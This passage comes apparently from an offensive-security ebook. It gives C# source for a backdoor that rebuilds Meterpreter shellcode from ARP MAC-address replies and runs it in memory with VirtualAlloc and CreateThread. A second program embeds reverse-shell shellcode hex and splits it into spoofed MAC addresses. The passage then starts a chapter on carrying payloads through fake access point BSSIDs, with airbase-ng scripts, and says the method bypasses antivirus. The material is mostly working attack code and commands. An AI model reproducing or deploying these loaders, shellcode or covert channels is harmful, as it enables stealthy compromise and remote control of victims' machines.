Traffic\");\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher\");\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r            Console.WriteLine(\"Unknown Mac Address Displayed by Red Color\");\n\r\n\r            Console.WriteLine(\"Getting Injected MacAddress By ARP Traffic (Slow)\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r            string Target_IPaddress_ARP_Request = \"\";\n\r\n\r            string local_IPaddress_ARP_Request = \"\";\n\r\n\r            try\n\r\n\r            {\n\r\n\r                if (args.Length &gt;= 1)\n\r\n\r                {\n\r\n\r                    Target_IPaddress_ARP_Request = args[0].ToString();\n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Please type Target System IPaddress for Sending ARP Request\");\n\r\n\r                    Target_IPaddress_ARP_Request = Console.ReadLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Please type your Local IPaddress for Sending ARP Request by this IP\");\n\r\n\r                    local_IPaddress_ARP_Request = Console.ReadLine();\n\r\n\r                }\n\r\n\r            }\n\r\n\r            catch (Exception e1)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"error 1: {0}\", e1.Message);\n\r\n\r \n\r\n\r            }\n\r\n\r            Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r            Console.WriteLine(\"Start time : {0}\", DateTime.Now.ToString());\n\r\n\r \n\r\n\r            string temp_arps = \"\";\n\r\n\r            string temp_arps_2 = \"\";\n\r\n\r            byte[] mac = new byte[6];\n\r\n\r            byte[] temp_mac = new byte[6];\n\r\n\r            int maclen = 0;\n\r\n\r            bool init = false;\n\r\n\r            int init_countdown = 0;\n\r\n\r            List&lt;string&gt; MacAddress = new List&lt;string&gt;();\n\r\n\r            try\n\r\n\r            {\n\r\n\r                while (true)\n\r\n\r                {\n\r\n\r                    maclen = mac.Length;\n\r\n\r \n\r\n\r                    int _mac = SendArp(ConvertIPToInt32(IPAddress.Parse(Target_IPaddress_ARP_Request)), ConvertIPToInt32(IPAddress.Parse(local_IPaddress_ARP_Request)), mac, ref maclen);\n\r\n\r \n\r\n\r                    System.Threading.Thread.Sleep(1000);               \n\r\n\r \n\r\n\r                    if (_mac == 0)\n\r\n\r                    {\n\r\n\r                        temp_arps = \"\";\n\r\n\r                        temp_arps_2 = \"\";\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                        Console.Write(\"Found   \" + \" : \");\n\r\n\r                        string srt_ip = Target_IPaddress_ARP_Request;\n\r\n\r                        Console.Write(\"Get Mac ==&gt; \" + srt_ip + \" MacAddress : \");\n\r\n\r                        foreach (byte item in mac)\n\r\n\r                        {\n\r\n\r                            if ((Convert.ToInt32(mac[0]) != 0))\n\r\n\r                            {\n\r\n\r                                /// if first section of MAC address != 00 then show that by Red Color\n\r\n\r                                /// this code added for macchanger in linux when this tool sent Unknown Mac to Backdoor system\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                            }\n\r\n\r                            else if ((Convert.ToInt32(mac[0]) == 0))\n\r\n\r                            {\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                            }\n\r\n\r                            Console.Write(item.ToString(\"x2\") + \" \");\n\r\n\r                            temp_arps += item.ToString(\"x2\");\n\r\n\r                            temp_arps_2 += item.ToString(\"x2\");\n\r\n\r                        }\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Arps += temp_arps.Remove(0, 2);\n\r\n\r                        string tmp = temp_arps.Remove(0, 2);\n\r\n\r                        if (MacAddress.Count == 0 &amp;&amp; tmp.ToString() != \"ffffffffff\" &amp;&amp; tmp.ToString() != \"ff00ff00ff\" &amp;&amp; init &amp;&amp; temp_arps_2.ToString().Substring(0, 2) == \"00\")\n\r\n\r                        {\n\r\n\r                            MacAddress.Add(tmp);\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                            Console.WriteLine(\"[\" + init_countdown.ToString() + \"] Dumping Bytes: \" + MacAddress.AsEnumerable().AsQueryable().Last().ToString());\n\r\n\r                        }\n\r\n\r                        else\n\r\n\r                        {\n\r\n\r                            /// time to exit and execute Payload ;-/\n\r\n\r                            if (tmp.ToString() == \"ffffffffff\" &amp;&amp; init) { break; }\n\r\n\r                            //if (Arps.ToString() == \"ffffffffff\") { break; }\n\r\n\r \n\r\n\r                            /// time to strat and dump Payload ;-/\n\r\n\r                            if (temp_arps_2.ToString() == \"00ff00ff00ff\") { init = true; init_countdown++; }\n\r\n\r \n\r\n\r                            if (init)\n\r\n\r                            {\n\r\n\r                                if (MacAddress.Capacity != 0 &amp;&amp; MacAddress.AsEnumerable().Last().ToString() != tmp &amp;&amp; init_countdown &gt; 1 &amp;&amp; temp_arps_2.ToString().Substring(0, 2) == \"00\")\n\r\n\r                                {\n\r\n\r                                    MacAddress.Add(tmp);\n\r\n\r                                    Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                                    Console.WriteLine(\"[\" + init_countdown.ToString() + \"] Dumping Bytes: \" + MacAddress.AsEnumerable().AsQueryable().Last().ToString());\n\r\n\r                                }\n\r\n\r                                init_countdown++;\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    else if (_mac == 67)\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                        Console.Write(\"NotFound\" + \" : \");\n\r\n\r                        string srt_ip = Target_IPaddress_ARP_Request;\n\r\n\r                        Console.Write(\"Get Mac ==&gt; \" + srt_ip + \" MacAddress : \");\n\r\n\r                        foreach (byte item in mac)\n\r\n\r                        {\n\r\n\r                            Console.Write(item.ToString(\"x2\") + \" \");\n\r\n\r                        }\n\r\n\r                        Console.WriteLine();\n\r\n\r                    }\n\r\n\r                    temp_mac = mac;\n\r\n\r                    System.Threading.Thread.Sleep(4000);\n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r            catch (Exception e2)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"error 2: {0}\", e2.Message);\n\r\n\r            }\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine();\n\r\n\r            /// for debug only\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"Debug Mode , Dumping this payload by ARP Traffic:\");\n\r\n\r            Console.WriteLine(\"Debug Mode , you can compare this Dump Data by your Source Payload \\\"Meterpreter msfvennom C type payload\\\"\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            foreach (string item in MacAddress)\n\r\n\r            {\n\r\n\r                Console.Write(item);\n\r\n\r            }\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            /// time to execute \n\r\n\r            /// \n\r\n\r            byte[] _X_Bytes = new byte[MacAddress.Capacity * 5];\n\r\n\r            int b = 0;\n\r\n\r            foreach (string X_item in MacAddress)\n\r\n\r            {\n\r\n\r                for (int i = 0; i &lt;= 8;)\n\r\n\r                {\n\r\n\r                    /// for debug only\n\r\n\r                    /// string MacAddress_Octets = X_item.ToString().Substring(i, 2);                 \n\r\n\r                    _X_Bytes[b] = Convert.ToByte(\"0x\" + X_item.ToString().Substring(i, 2), 16);\n\r\n\r                    b++;\n\r\n\r                    i++; i++;\n\r\n\r                }\n\r\n\r            }\n\r\n\r            try\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                Console.WriteLine(\"End time : {0}\", DateTime.Now.ToString());\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by ARP Traffic ;)\");\n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)_X_Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(_X_Bytes, 0, (IntPtr)(funcAddr), _X_Bytes.Length);\n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r                // execute native code\n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r            }\n\r\n\r            catch (Exception e3)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"error 3: {0}\", e3.Message);\n\r\n\r            }\n\r\n\r \n\r\n\r        }\n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}\n\r\n\r\n\r\n\r \n\r\n\rPayload_to_Mac.cs\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Text;\n\r\n\rusing Microsoft.Win32;\n\r\n\rusing System.Management.Instrumentation;\n\r\n\rusing System.Management;\n\r\n\rusing System.Reflection;\n\r\n\rusing System.Runtime.CompilerServices;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\r \n\r\n\rnamespace Payload_to_Mac\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static string payload = \"fc4883e4f0e8cc0000004151415052\"\n\r\n\r           + \"51564831d265488b5260488b521848\"\n\r\n\r           + \"8b5220488b7250480fb74a4a4d31c9\"\n\r\n\r           + \"4831c0ac3c617c022c2041c1c90d41\"\n\r\n\r           + \"01c1e2ed524151488b52208b423c48\"\n\r\n\r           + \"01d0668178180b020f85720000008b\"\n\r\n\r           + \"80880000004885c074674801d0508b\"\n\r\n\r           + \"4818448b40204901d0e35648ffc941\"\n\r\n\r           + \"8b34884801d64d31c94831c0ac41c1\"\n\r\n\r           + \"c90d4101c138e075f14c034c240845\"\n\r\n\r           + \"39d175d858448b40244901d066418b\"\n\r\n\r           + \"0c48448b401c4901d0418b04884801\"\n\r\n\r           + \"d0415841585e595a41584159415a48\"\n\r\n\r           + \"83ec204152ffe05841595a488b12e9\"\n\r\n\r           + \"4bffffff5d49be7773325f33320000\"\n\r\n\r           + \"41564989e64881eca00100004989e5\"\n\r\n\r           + \"49bc0200115cc0a8013241544989e4\"\n\r\n\r           + \"4c89f141ba4c772607ffd54c89ea68\"\n\r\n\r           + \"010100005941ba29806b00ffd56a05\"\n\r\n\r           + \"415e50504d31c94d31c048ffc04889\"\n\r\n\r           + \"c248ffc04889c141baea0fdfe0ffd5\"\n\r\n\r           + \"4889c76a1041584c89e24889f941ba\"\n\r\n\r           + \"99a57461ffd585c0740a49ffce75e5\"\n\r\n\r           + \"e8930000004883ec104889e24d31c9\"\n\r\n\r           + \"6a0441584889f941ba02d9c85fffd5\"\n\r\n\r           + \"83f8007e554883c4205e89f66a4041\"\n\r\n\r           + \"59680010000041584889f24831c941\"\n\r\n\r           + \"ba58a453e5ffd54889c34989c74d31\"\n\r\n\r           + \"c94989f04889da4889f941ba02d9c8\"\n\r\n\r           + \"5fffd583f8007d2858415759680040\"\n\r\n\r           + \"000041586a005a41ba0b2f0f30ffd5\"\n\r\n\r           + \"575941ba756e4d61ffd549ffcee93c\"\n\r\n\r           + \"ffffff4801c34829c64885f675b441\"\n\r\n\r           + \"ffe7586a005949c7c2f0b5a256ffd5\";\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            try\n\r\n\r            {\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.WriteLine(\"Payload_to_Mac v1.0 Tool (MacChanger) \");\n\r\n\r                Console.WriteLine(\"Published by Damon Mohammadbagher\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                Console.WriteLine(\"Warning : You should RunAs Administrator this tool for changing Mac Address\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine(\"Warning : this code tested with Win7x64-SP1\");\n\r\n\r                Console.WriteLine(\"Warning : Win8 , Win10 Not Tested ;)\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"Step I  syntax 0 : Payload_to_Mac.exe null\");\n\r\n\r                Console.WriteLine(\"Step I  syntax 1 (Windows) : Payload_to_Mac.exe null \\\"PAYLOAD\\\" \");\n\r\n\r                Console.WriteLine(\"Step I  Example 1: Payload_to_Mac.exe null \\\"5fffd583f8007d2858415759680040\\\" \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"Step I  syntax 0 : Payload_to_Mac.exe lin\");\n\r\n\r                Console.WriteLine(\"Step I  syntax 1 (Linux) : Payload_to_Mac.exe lin \\\"PAYLOAD\\\" \");\n\r\n\r                Console.WriteLine(\"Step I  Example 1: Payload_to_Mac.exe lin \\\"5fffd583f8007d2858415759680040\\\" \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"Step II syntax 2 : Payload_to_Mac.exe Regkey_Parent  [00+Payload] \\\"Connection Name\\\" \");\n\r\n\r                Console.WriteLine(\"Step II Example 2: Payload_to_Mac.exe 0007  005fffd583f8 \\\"Local Area Connection\\\" \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkRed;\n\r\n\r                Console.WriteLine(@\"Check your Parent Regkey in this address: \");\n\r\n\r                Console.WriteLine(@\"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r \n\r\n\r                if (args.Length &gt;= 1 &amp;&amp; (args[0].ToUpper() == \"NULL\" || args[0].ToUpper()==\"LIN\") )\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    if (args[0].ToUpper() == \"NULL\")\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(\"Copy these lines to one BAT file ;)\");\n\r\n\r                        Console.WriteLine(\"You should RunAs Administrator this BAT file\");\n\r\n\r                        Console.WriteLine();\n\r\n\r                    }\n\r\n\r                    else if (args[0].ToUpper() == \"LIN\")\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(\"Copy these lines to one Bash Script file for Linux ;)\");\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\" #!/bin/bash\");\n\r\n\r                        Console.WriteLine(\"sudo ifconfig eth0 down; sudo macchanger -m  \" + \"00:ff:00:ff:00:ff\" + \" eth0; sudo ifconfig eth0 up; sleep 10;\");\n\r\n\r                    }\n\r\n\r                    \n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    if (args.Length &gt;= 2 &amp;&amp; args[1] != null) { payload = args[1].ToString(); }\n\r\n\r                    int b = 0;\n\r\n\r                    string temp = \"\";\n\r\n\r                    string temp_mac_addresses = \"\";\n\r\n\r                  \n\r\n\r                    foreach (char item in payload)\n\r\n\r                    {\n\r\n\r                        temp += item;\n\r\n\r                        b++;\n\r\n\r                        if (b &gt;= 10)\n\r\n\r                        {\n\r\n\r                            if (args[0].ToUpper() == \"NULL\")\n\r\n\r                                Console.Write(\"Payload_to_Mac.exe \" + \"0007\" + \" \" + \"00\" + temp + \" \\\"Local Network Connection\\\"\");\n\r\n\r                            if (args[0].ToUpper() == \"LIN\")\n\r\n\r                            {\n\r\n\r                                /// 00:48:31:c0:ac:3c ==&gt; \"00\" + 48:31:c0:ac:3c\n\r\n\r                                for (int i = 0; i &lt; 10;)\n\r\n\r                                {\n\r\n\r                                    temp_mac_addresses += temp.Substring(i, 2) + \":\";\n\r\n\r                                    i++;\n\r\n\r                                    i++;\n\r\n\r                                }                                \n\r\n\r                                Console.Write(\"sudo ifconfig eth0 down; sudo macchanger -m  \" + \"00:\" + temp_mac_addresses.Substring(0,temp_mac_addresses.Length-1) + \" eth0; sudo ifconfig eth0 up; sleep 10;\");\n\r\n\r                            }\n\r\n\r                            Console.WriteLine(\"\"); b = 0;\n\r\n\r                            temp = \"\";\n\r\n\r                            temp_mac_addresses = \"\";\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    if (args[0].ToUpper() == \"LIN\")\n\r\n\r                        Console.WriteLine(\"sudo ifconfig eth0 down; sudo macchanger -m  \" + \"00:ff:ff:ff:ff:ff\" + \" eth0; sudo ifconfig eth0 up; sleep 10;\");\n\r\n\r \n\r\n\r                    Console.WriteLine(\"\");\n\r\n\r                    Console.WriteLine(\"rem PAYLOAD : \" + payload);\n\r\n\r                }\n\r\n\r                else if (args.Length &gt;= 1)\n\r\n\r                {\n\r\n\r                    string __RegkeyParentkeyNumber = \"0007\";\n\r\n\r                    string NIC_Name = \"Local Network Connection\";\n\r\n\r                    NIC_Name = args[2].ToString();\n\r\n\r                    __RegkeyParentkeyNumber = args[0].ToString();\n\r\n\r                    string regkeyadd = args[1].ToString();\n\r\n\r \n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    Console.WriteLine(\"Disable NIC \");\n\r\n\r                    SelectQuery wmiQuery = new SelectQuery(\"SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionId != NULL\");\n\r\n\r                    ManagementObjectSearcher searchProcedure = new ManagementObjectSearcher(wmiQuery);\n\r\n\r                    foreach (ManagementObject item in searchProcedure.Get())\n\r\n\r                    {\n\r\n\r                        if (((string)item[\"NetConnectionId\"]) == NIC_Name)\n\r\n\r                        {\n\r\n\r                            item.InvokeMethod(\"Disable\", null);\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    Console.WriteLine(\"Set Payload to mac \");\n\r\n\r                    RegistryKey rkey;\n\r\n\r                    /// for win10 i think this regkey \"RKEY\" address should be CHANGE ;-/\n\r\n\r                    /// this code tested with win7x64-sp1\n\r\n\r                    rkey = Registry.LocalMachine.CreateSubKey(@\"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\\" + __RegkeyParentkeyNumber);\n\r\n\r\n\r\n\r                    rkey.SetValue(\"NetworkAddress\", regkeyadd);\n\r\n\r                    System.Threading.Thread.Sleep(6000);\n\r\n\r                    Console.WriteLine(\"Enable NIC \");\n\r\n\r                    SelectQuery wmiQuery2 = new SelectQuery(\"SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionId != NULL\");\n\r\n\r                    ManagementObjectSearcher searchProcedure2 = new ManagementObjectSearcher(wmiQuery2);\n\r\n\r                    foreach (ManagementObject item in searchProcedure2.Get())\n\r\n\r                    {\n\r\n\r                        if (((string)item[\"NetConnectionId\"]) == NIC_Name)\n\r\n\r                        {\n\r\n\r                            item.InvokeMethod(\"Enable\", null);\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                    Console.WriteLine(\"Mac Set : {0}\", regkeyadd);\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                    System.Threading.Thread.Sleep(10000);\n\r\n\r                }\n\r\n\r            }\n\r\n\r            catch (Exception e)\n\r\n\r            {\n\r\n\r                Console.WriteLine(\"Error 1: {0}\", e.Message);\n\r\n\r            }\n\r\n\r        }\n\r\n\r        private const string baseReg = @\"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\\";\n\r\n\r \n\r\n\r        public static bool SetMAC(string nicid, string newmac)\n\r\n\r        {\n\r\n\r            bool ret = false;\n\r\n\r            using (RegistryKey bkey = GetBaseKey())\n\r\n\r            using (RegistryKey key = bkey.OpenSubKey(baseReg + nicid))\n\r\n\r            {\n\r\n\r                if (key != null)\n\r\n\r                {\n\r\n\r                    key.SetValue(\"NetworkAddress\", newmac, RegistryValueKind.String);\n\r\n\r \n\r\n\r                    ManagementObjectSearcher mos = new ManagementObjectSearcher(\n\r\n\r                        new SelectQuery(\"SELECT * FROM Win32_NetworkAdapter WHERE Index = \" + nicid));\n\r\n\r \n\r\n\r                    foreach (ManagementObject o in mos.Get().OfType&lt;ManagementObject&gt;())\n\r\n\r                    {\n\r\n\r                        o.InvokeMethod(\"Disable\", null);\n\r\n\r                        o.InvokeMethod(\"Enable\", null);\n\r\n\r                        ret = true;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r            }\n\r\n\r            return ret;\n\r\n\r        }     \n\r\n\r \n\r\n\r        private static RegistryKey GetBaseKey()\n\r\n\r        {\n\r\n\r            throw new NotImplementedException();\n\r\n\r        }\n\r\n\r    }\n\r\n\r}\n\r\n\r ","","topics\\Chapter 8.html","\n\r\n\r \n\r\n\rTransferring Backdoor Payload by Wireless Traffic (BSSID) \n\r\n\r \n\r\n\rUnderstanding this method :\n\r\n\rTransferring Backdoor Payloads with BSSID by Wireless Traffic.\n\r\n\r \n\r\n\rin this chapter I want to talk about Wireless Access Point and BSSID (MAC-Address AP).\n\r\n\rWe talked about ARP traffic and IPv4 traffic now we should talk about something like that via Wireless Traffic so this technique is something like ARP Technique .\n\r\n\r \n\r\n\rSo again we have Backdoor Payload without File-system encryption and without hardcoded Payload in File-system (only in memory) so again you can bypass all Anti-viruses by this method also we have Meterpreter Payload Transferring without Payloads Encryption over Network Traffic in this case Wireless Traffic (on Air).\n\r\n\r \n\r\n\rIn this case an attacker can perform this attack with Changing BSSID like (Loop changing) for fake AP , it means you can do this just by changing BSSID and Injecting your Backdoor Payload step by step to BSSID (MAC-Address for fake AP) and in client side Infected system (backdoor system) can Dump these Payload steps by Scanning Access Points MAC-Address (BSSID) on AIR without connecting to Fake AP by user-pass so Transferring Payloads will happen by Wifi Devices for example wlan (Wireless Traffic) without User-Password also in my scenario Meterpreter Session established by Ethernet Network (without Wifi/wireless Device) After dump the Payloads by scanning BSSID on AIR.\n\r\n\r \n\r\n\rSo you will see malware code or in this case Simple Backdoor code can use your WIFI Devices for Transferring/Dumping Payloads silently in this case Wlan and finally you have meterpreter session with Simple C# code.\n\r\n\r \n\r\n\rIn my scenario I used Wifi Device just for Transferring Payloads (Step 1) and dump these Payloads by scanning Wifi Device MAC-Address (BSSID) then my backdoor will make Meterpreter Session by eth0 or Ethernet Card for Establishing Meterpreter Session so in this phase (step 2) we use Network Traffic without WIFI device for establishing Meterpreter Session .\n\r\n\r \n\r\n\rWhat is Important Point for this method ?\n\r\n\r \n\r\n\rimportant points is : malware or backdoor Payload injection to BSSID for Wifi Device and Transferring by Wireless Traffic is possible.\n\r\n\r \n\r\n\rScanning injected Payloads to BSSIDs from Fake AP , Step by step :\n\r\n\r \n\r\n\rfor example we have this Payload for transferring : “fec8b00011ddc00945f1”\n\r\n\r \n\r\n\r\n\r•step 1: attacker system make one Fake Access-Point with name “Fake” and Mac-Address is 00:fe:c8:b0:00:11 \n\r\n\r\n\r•note : Mac-Address 00:fe:c8:b0:00:11 is our Injected Payload so our payload is “fec8b00011”  \n\r\n\r\n\r•this section of payload “fec8b00011ddc00945f1”  \n\r\n\r\n\r•step 2: backdoor system Scanning Essid “Fake” and dumping BSSID for that \n\r\n\r\n\r•note : your backdoor code should dump these section of BSSID or Mac-Address fe:c8:b0:00:11 ==&gt; fec8b00011  \n\r\n\r\n\r•step 3: attacker system make one Fake Access-Point with name “Fake” and Mac-Address 00:dd:c0:09:45:f1 \n\r\n\r\n\r•note: Mac-Address 00:dd:c0:09:45:f1 is our Injected Payload so our payload is “ddc00945f1”  \n\r\n\r\n\r•this section of payload “fec8b00011ddc00945f1”  \n\r\n\r\n\r•step 4: backdoor system Scanning Essid “Fake” and dumping BSSID for that \n\r\n\r\n\r•note : your backdoor code should dump these section of BSSID or Mac-Address dd:c0:09:45:f1 ==&gt; ddc00945f1  \n\r\n\r\n\r \n\r\n\rafter these 2 step (scanning) , you will have this payload fec8b00011ddc00945f1 in infected system (backdoor system)\n\r\n\rnow you can understand how this method worked so let me show you more information for these (step 1 and step 3) by Commands in the linux side. (time to make Fake AP by commands)\n\r\n\r \n\r\n\rOptional commands : Changing TXPower for Wifi card before making Wlan0mon , these commands can help you for making better Fake AP signal so you can use this command manually if you want it.\n\r\n\r \n\r\n\rifconfig wlan0 down\n\r\n\riw reg set BO\n\r\n\rifconfig wlan0 up\n\r\n\riwconfig wlan0 txpower 30\n\r\n\r \n\r\n\rNote : these commands before making Wlan0Mon by airmon-ng should be used also these commands is optional (not required). \n\r\n\r \n\r\n\rmaking Monitor Mode for WLAN Card is important step for making Fake AP :\n\r\n\r \n\r\n\rwith this command “airmon-ng start wlan0” you can make “Wlan0Mon” (monitor mode) for your Wlan0.\n\r\n\r \n\r\n\r\n\r•step 1: attacker system make one Fake Access-Point with name “Fake” and Mac-Address 00:fe:c8:b0:00:11 \n\r\n\r\n\r•note : Mac-Address 00:fe:c8:b0:00:11 is our Injected Payload so our payload is “fec8b00011”  \n\r\n\r\n\r•cmd 1-1: airmon-ng start wlan0 \n\r\n\r\n\r•note : making Wlan0Mon (monitor mode)  \n\r\n\r\n\r•cmd 1-2: airbase-ng -a 00:fe:c8:b0:00:11 –essid “Fake” -I 10 -0 wlan0mon \n\r\n\r\n\r•note : you need make this Fake AP for 15 sec so you can kill this command in (cmd 1-2) after 15 sec by killall command  \n\r\n\r\n\r•cmd 1-3: sleep 15 \n\r\n\r\n\r•cmd 1-4: killall airbase-ng \n\r\n\r\n\r•step 3: attacker system make one Fake Access-Point with name “Fake” and Mac-Address 00:dd:c0:09:45:f1 \n\r\n\r\n\r•note : Mac-Address 00:dd:c0:09:45:f1 is our Injected Payload so our payload is “ddc00945f1”  \n\r\n\r\n\r•cmd 3-1: airbase-ng -a 00:dd:c0:09:45:f1 –essid “Fake” -I 10 -0 wlan0mon \n\r\n\r\n\r•note : you need make this Fake AP for 15 sec so you can kill this command in (cmd 3-1) after 15 sec by killall command  \n\r\n\r\n\r•cmd 3-2: sleep 15 \n\r\n\r\n\r•cmd 3-3: killall airbase-ng \n\r\n\r\n\r \n\r\n\ras you can see in these steps we should use these commands , but we have big problem with airbase-ng or maybe I had big problem with this nice command (airbase-ng)\n\r\n\r \n\r\n\rwhere is problem ?\n\r\n\r \n\r\n\rProblem started from step (cmd 1-2) up to (cmd 1-3) after step (cmd 1-2) you can\'t stop this airbase-ng command , just with ctrl+c or Killing this Command you can stop it … so my  script always stop in step: (cmd 1-2) until i kill this process one time.\n\r\n\rso for resolve this problem my solution is using 2 bash script file for these steps :\n\r\n\r\n\r•First bash script file is “Script1.sh” for these steps (cmd 1-2 and cmd 3-1)  \n\r\n\r\n\r•note : you can add step (cmd 1-1) one time in first line of this bash script or do that manually one time. In this case I performed (cmd 1-1) manually one time .  \n\r\n\r\n\r•Second bash script is “Script2.sh” for these steps (cmd 1-3 &amp; cmd 1-4 &amp; cmd 3-2 &amp; cmd 3-3)  \n\r\n\r\n\r•so in this scenario we should first run bash script “Script1.sh” then immediately or after 2-3 sec we should run bash script “Script2.sh”. \n\r\n\r\n\rSo we have something like these files\n\r\n\r \n\r\n\rScript1.sh file :\n\r\n\r#!/bin/bash\n\r\n\rairbase-ng -a 00:fe:c8:b0:00:11 –essid “Fake” -I 10 -0 wlan0mon ;\n\r\n\rairbase-ng -a 00:dd:c0:09:45:f1 –essid “Fake” -I 10 -0 wlan0mon ;\n\r\n\r \n\r\n\rScript2.sh file:\n\r\n\r#!/bin/bash\n\r\n\rsleep 15 ;\n\r\n\rkillall airbase-ng ;\n\r\n\rsleep 15 ;\n\r\n\rkillall airbase-ng ;\n\r\n\r \n\r\n\rNote: you can use loop commands like ( for ) in bash script “Script2.sh” file . \n\r\n\r \n\r\n\rNote: if you want to have Codes for Script1 and Script2  via single script you can use simple code like this but about this code we will talk in the next part of this chapter : “Linux systems and DATA Transferring - Exfiltration via BSSID by Wireless Traffic - PART2” so let me describe these codes in next part of this chapter .\n\r\n\r \n\r\n\rfunction killairbase\n\r\n\r{\n\r\n\r  sleep 10 ;\n\r\n\r  echo\n\r\n\r  killall airbase-ng ;\n\r\n\r}\n\r\n\r \n\r\n\rkillairbase | airbase-ng -a 00:fe:c8:b0:00:11 --essid $3 -I 10 -0 $4 | grep started         \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rAs you can see in Picture A we have script1.sh file for injecting Meterpreter Payloads to BSSIDs.\n\r\n\r Picture A: \n\r\n\ras you can see in picture A , from line 3 